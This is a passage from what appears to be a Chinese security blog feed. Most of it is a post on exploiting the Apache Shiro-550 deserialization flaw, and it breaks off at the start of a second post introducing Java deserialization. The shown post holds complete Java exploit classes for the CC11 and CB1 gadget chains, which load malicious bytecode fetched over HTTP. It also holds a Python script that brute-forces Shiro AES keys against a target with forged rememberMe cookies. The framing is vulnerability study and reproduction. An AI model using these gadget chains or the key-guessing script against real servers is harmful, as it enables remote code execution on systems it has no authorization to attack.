class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.shlin;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> shlin</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> DeserializeChain</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.shlin.CC11Exp.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/9/30 19:05</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC11Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getEvilBytes(String u) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(u).openConnection().getInputStream();<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-type">int</span> length;<br>        <span class="hljs-keyword">while</span> ((length = inputStream.read(buffer)) != -<span class="hljs-number">1</span>) &#123;<br>            byteArrayOutputStream.write(buffer, <span class="hljs-number">0</span>, length);<br>        &#125;<br>        <span class="hljs-keyword">return</span> byteArrayOutputStream.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-comment">//        byte[] evilCodes = Files.readAllBytes(Paths.get(&quot;D:\\\\SecTools\\\\web\\\\DeserializeChain\\\\CC11\\\\src\\\\main\\\\java\\\\com\\\\shlin\\\\entity\\\\calc.class&quot;));</span><br>        <span class="hljs-type">byte</span>[] evilCodes = getEvilBytes(<span class="hljs-string">&quot;http://127.0.0.1:8000/calc.class&quot;</span>);<br>        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">TemplatesImpl</span>&gt; templatesClass = templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;evilCodes&#125;);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        name.set(templates, <span class="hljs-string">&quot;cc11&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">newTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br><br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">decorateMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, newTransformer);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(hashMap, templates);<br>        hashMap.put(tiedMapEntry, <span class="hljs-number">123</span>);<br>        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">TiedMapEntry</span>&gt; tiedMapEntryClass = tiedMapEntry.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> tiedMapEntryClass.getDeclaredField(<span class="hljs-string">&quot;map&quot;</span>);<br>        map.setAccessible(<span class="hljs-literal">true</span>);<br>        map.set(tiedMapEntry, decorateMap);<br>        serialize(hashMap);<br>        <span class="hljs-comment">//        deserialize(&quot;cc11-ser.bin&quot;);</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;cc11-ser.bin&quot;</span>));<br>        objectOutputStream.writeObject(o);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename)).readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ok，成功！</p><h2 id="3-4-CB1利用链攻击"><a href="#3-4-CB1利用链攻击" class="headerlink" title="3.4 CB1利用链攻击"></a>3.4 CB1利用链攻击</h2><p>Shiro-550使用CB1利用链进行攻击的时候存在版本问题，shiro自带的Commons-BeanUtils是1.8.3版本的，在生成序列化串的时候也需要使用相应版本的Commons-BeanUtils；否则服务端会报错</p><p>org.apache.commons.beanutils.BeanComparator; local class incompatible: stream classdesc serialVersionUID &#x3D; -2044202215314119608, local class serialVersionUID &#x3D; -3490850999041592962</p><p>根据Drun1baby师傅所说：</p><p>如果两个不同版本的库使用了同一个类，而这两个类可能有一些方法和属性有了变化，此时在序列化通信的时候就可能因为不兼容导致出现隐患。因此，Java在反序列化的时候提供了一个机制，序列化时会根据固定算法计算出一个当前类的 <code>serialVersionUID</code> 值，写入数据流中；反序列化时，如果发现对方的环境中这个类计算出的 <code>serialVersionUID</code> 不同，则反序列化就会异常退出，避免后续的未知隐患。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.shlin;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> shlin</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@project</span> DeserializeChain</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@file</span> com.shlin.CB1Exp.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> 2024/9/26 21:00</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CB1Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getEvilBytes(String u) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(u).openConnection().getInputStream();<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-type">int</span> length;<br>        <span class="hljs-keyword">while</span> ((length = inputStream.read(buffer)) != -<span class="hljs-number">1</span>) &#123;<br>            byteArrayOutputStream.write(buffer, <span class="hljs-number">0</span>, length);<br>        &#125;<br>        <span class="hljs-keyword">return</span> byteArrayOutputStream.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">TemplatesImpl</span>&gt; templatesClass = templates.getClass();<br>        <span class="hljs-comment">//        byte[] evilClass = Files.readAllBytes(Paths.get(&quot;D:\\SecTools\\web\\DeserializeChain\\CB1\\src\\main\\java\\com\\shlin\\entity\\Calc.class&quot;));</span><br>        <span class="hljs-type">byte</span>[] evilClass = getEvilBytes(<span class="hljs-string">&quot;http://127.0.0.1:8000/Calc.class&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        name.set(templates, <span class="hljs-string">&quot;cb1&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytes</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytes.setAccessible(<span class="hljs-literal">true</span>);<br>        bytes.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;evilClass&#125;);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();<br>        PriorityQueue&lt;Object&gt; priorityQueue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(<span class="hljs-number">2</span>, beanComparator);<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br>        beanComparator.setProperty(<span class="hljs-string">&quot;outputProperties&quot;</span>);<br>        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">PriorityQueue</span>&gt; queueClass = priorityQueue.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">queue</span> <span class="hljs-operator">=</span> queueClass.getDeclaredField(<span class="hljs-string">&quot;queue&quot;</span>);<br>        queue.setAccessible(<span class="hljs-literal">true</span>);<br>        queue.set(priorityQueue, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates, templates&#125;);<br><br>        serialize(priorityQueue);<br>        <span class="hljs-comment">//        deserialize(&quot;cb1-ser.bin&quot;);</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;cb1-ser.bin&quot;</span>));<br>        objectOutputStream.writeObject(o);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-keyword">return</span> objectInputStream.readObject();<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409302215471.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409302214761.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202409302215439.png" alt="img"></p><h1 id="四、漏洞探测"><a href="#四、漏洞探测" class="headerlink" title="四、漏洞探测"></a>四、漏洞探测</h1><h2 id="4-1-指纹识别"><a href="#4-1-指纹识别" class="headerlink" title="4.1 指纹识别"></a>4.1 指纹识别</h2><p>在利用 shiro 漏洞时需要判断应用是否用到了 shiro。<br>在请求包的 Cookie 中为 <code>rememberMe</code> 字段赋任意值，收到返回包的 Set-Cookie 中存在 <code>rememberMe=deleteMe</code> 字段，说明目标有使用 Shiro 框架，可以进一步测试。</p><h2 id="4-2-AES密钥判断"><a href="#4-2-AES密钥判断" class="headerlink" title="4.2 AES密钥判断"></a>4.2 AES密钥判断</h2><p>前面说到 Shiro 1.2.4 以上版本官方移除了代码中的默认密钥，要求开发者自己设置，如果开发者没有设置，则默认动态生成，降低了固定密钥泄漏的风险。</p><p>即使升级到了1.2.4以上的版本，很多开源的项目会自己设定密钥。可以收集密钥的集合，或者对密钥进行爆破。</p><p>那么如何判断密钥是否正确呢？<br>文章 <a href="https://mp.weixin.qq.com/s?__biz=MzIzOTE1ODczMg==&mid=2247485052&idx=1&sn=b007a722e233b45982b7a57c3788d47d&scene=21#wechat_redirect">一种另类的 shiro 检测方式</a>提供了思路，当密钥不正确或类型转换异常时，目标 Response 包含 <code>Set-Cookie：rememberMe=deleteMe</code> 字段，而当密钥正确且没有类型转换异常时，返回包不存在 <code>Set-Cookie：rememberMe=deleteMe</code> 字段。</p><p>因此我们需要构造 payload 排除类型转换错误，进而准确判断密钥。</p><p>shiro 在 1.4.2 版本之前， AES 的模式为 CBC， IV 是随机生成的，并且 IV 并没有真正使用起来，所以整个 AES 加解密过程的 key 就很重要了，正是因为 AES 使用 Key 泄漏导致反序列化的 cookie 可控，从而引发反序列化漏洞。<br>在 1.4.2 版本后，shiro 已经更换加密模式 AES-CBC 为 AES-GCM，脚本编写时需要考虑加密模式变化的情况。</p><p>这里给出大佬 Veraxy 的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt_AES_GCM</span>(<span class="hljs-params">msg, secretKey</span>):<br>    aesCipher = AES.new(secretKey, AES.MODE_GCM)<br>    ciphertext, authTag = aesCipher.encrypt_and_digest(msg)<br>    <span class="hljs-keyword">return</span> (ciphertext, aesCipher.nonce, authTag)<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode_rememberme</span>(<span class="hljs-params">target</span>):<br>    keys = [<span class="hljs-string">&#x27;kPH+bIxk5D2deZiIxcaaaA==&#x27;</span>, <span class="hljs-string">&#x27;4AvVhmFLUs0KTA3Kprsdag==&#x27;</span>,<span class="hljs-string">&#x27;66v1O8keKNV3TTcGPK1wzg==&#x27;</span>, <span class="hljs-string">&#x27;SDKOLKn2J1j/2BHjeZwAoQ==&#x27;</span>]     <span class="hljs-comment"># 此处简单列举几个密钥</span><br>    BS = AES.block_size<br>    pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br>    mode = AES.MODE_CBC<br>    iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br> <br>    file_body = base64.b64decode(<span class="hljs-string">&#x27;rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA==&#x27;</span>)<br>    <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> keys:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># CBC加密</span><br>            encryptor = AES.new(base64.b64decode(key), mode, iv)<br>            base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(file_body)))<br>            res = requests.get(target, cookies=&#123;<span class="hljs-string">&#x27;rememberMe&#x27;</span>: base64_ciphertext.decode()&#125;,timeout=<span class="hljs-number">3</span>,verify=<span class="hljs-literal">False</span>, allow_redirects=<span class="hljs-literal">False</span>)<br>            <span class="hljs-keyword">if</span> res.headers.get(<span class="hljs-string">&quot;Set-Cookie&quot;</span>) == <span class="hljs-literal">None</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正确KEY ：&quot;</span> + key)<br>                <span class="hljs-keyword">return</span> key<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;rememberMe=deleteMe;&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res.headers.get(<span class="hljs-string">&quot;Set-Cookie&quot;</span>):<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正确key:&quot;</span> + key)<br>                    <span class="hljs-keyword">return</span> key<br>            <span class="hljs-comment"># GCM加密</span><br>            encryptedMsg = encrypt_AES_GCM(file_body, base64.b64decode(key))<br>            base64_ciphertext = base64.b64encode(encryptedMsg[<span class="hljs-number">1</span>] + encryptedMsg[<span class="hljs-number">0</span>] + encryptedMsg[<span class="hljs-number">2</span>])<br>            res = requests.get(target, cookies=&#123;<span class="hljs-string">&#x27;rememberMe&#x27;</span>: base64_ciphertext.decode()&#125;, timeout=<span class="hljs-number">3</span>, verify=<span class="hljs-literal">False</span>, allow_redirects=<span class="hljs-literal">False</span>)<br> <br>            <span class="hljs-keyword">if</span> res.headers.get(<span class="hljs-string">&quot;Set-Cookie&quot;</span>) == <span class="hljs-literal">None</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正确KEY:&quot;</span> + key)<br>                <span class="hljs-keyword">return</span> key<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;rememberMe=deleteMe;&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res.headers.get(<span class="hljs-string">&quot;Set-Cookie&quot;</span>):<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正确key:&quot;</span> + key)<br>                    <span class="hljs-keyword">return</span> key<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正确key:&quot;</span> + key)<br>            <span class="hljs-keyword">return</span> key<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><h1 id="五、参考连接"><a href="#五、参考连接" class="headerlink" title="五、参考连接"></a>五、参考连接</h1><ol><li><p><a href="https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#0x05-%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B">Java 反序列化 Shiro 篇 01-Shiro550 流程分析</a></p></li><li><p><a href="https://www.bilibili.com/video/BV1iF411b7bD?spm_id_from=0.0.header_right.fav_list.click&vd_source=a4eba559e280bf2f1aec770f740d0645">Shiro反序列化漏洞(一)-shiro550流程分析_哔哩哔哩_bilibili</a></p></li><li><p><a href="https://johnfrod.top/%E5%AE%89%E5%85%A8/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">Shiro550反序列化漏洞分析 – JohnFrod’s Blog</a></p></li></ol>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>反序列化</tag>
      
      <tag>Shiro</tag>
      
      <tag>CVE</tag>
      
      <tag>漏洞分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java反序列化从零到入门</title>
    <link href="/2024/12/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E9%9B%B6%E5%88%B0%E5%85%A5%E9%97%A8/"/>
    <url>/2024/12/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%8E%E9%9B%B6%E5%88%B0%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="零、环境搭建"><a href="#零、环境搭建" class="headerlink" title="零、环境搭建"></a>零、环境搭建</h1><h2 id="0-1-基础环境"><a href="#0-1-基础环境" class="headerlink" title="0.1 基础环境"></a>0.1 基础环境</h2><p>下面的基础的环境，不做特别说明时，均使用以下环境: </p><ul><li>IDE：idea2024.2.2</li><li>jdk：<a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">jdk1.8.0_65</a></li><li>maven：maven3.9.8（idea自带）</li><li><a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4">openJDK 8u65</a></li><li>commons-collections 3.2.1</li></ul><h2 id="0-2-环境搭建"><a href="#0-2-环境搭建" class="headerlink" title="0.2 环境搭建"></a>0.2 环境搭建</h2><p>先下载好<a href="https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html">jdk1.8.0_65</a>，这部分相对比较简单，不在这里赘述了，网上搜索也有相关的教程，需要注意的就是配置环境变量的部分，跟着教程走，注意一下就好了。</p><p>下面说说怎么引入源码；</p><p>打开<a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4">openJDK 8u65</a>源码链接，下载源码；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412111442213.png" alt="img"></p><p>将下载下来的源码解压，得到源码文件，然后我们重点关注<code>/src/share/classes/sun</code>这个文件夹，这个就是我们需要的源码文件。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412111442754.png" alt="img"></p><p>然后我们打开我们下载安装好的jdk1.8.0_65文件夹，其中有一个src.zip压缩文件，将其解压到当前目录下。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412111444993.png" alt="img"></p><p>解压后，文件夹src中是没有sun文件夹的，我们将openjdk的源码文件夹<code>/src/share/classes/sun</code>贴过来</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412111442103.png" alt="img"></p><p>完成以上步骤就可以了，到时候我们需要查看jdk底层代码的时候就可以不需要看.class反编译的代码了。</p><h1 id="一、反序列化基础"><a href="#一、反序列化基础" class="headerlink" title="一、反序列化基础"></a>一、反序列化基础</h1><h2 id="1-1-基本介绍"><a href="#1-1-基本介绍" class="headerlink" title="1.1 基本介绍"></a>1.1 基本介绍</h2><h3 id="1-1-1-概念"><a href="#1-1-1-概念" class="headerlink" title="1.1.1 概念"></a>1.1.1 